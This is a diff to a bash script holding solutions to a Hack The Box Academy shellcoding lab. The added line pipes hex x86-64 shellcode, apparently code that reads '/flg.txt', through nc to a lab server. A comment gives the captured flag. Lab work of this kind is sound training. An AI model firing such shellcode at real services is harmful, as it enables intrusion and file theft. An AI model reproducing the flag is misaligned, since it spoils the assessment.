@@ -1,5 +1,8 @@
 #!/bin/bash
 
+# Assessment 2
+echo -n -e "6a0048bf2f666c672e74787457b0024889e74831f60f054889e64883ec404889c74831c0b2400f0588c2b00140b7010f05" | nc 94.237.61.84 33863
+# flag HTB{5h3llc0d1ng_g3n1u5}
 
 # Assessment 1 https://academy.hackthebox.com/module/85/section/909
 # xor rbx with stack
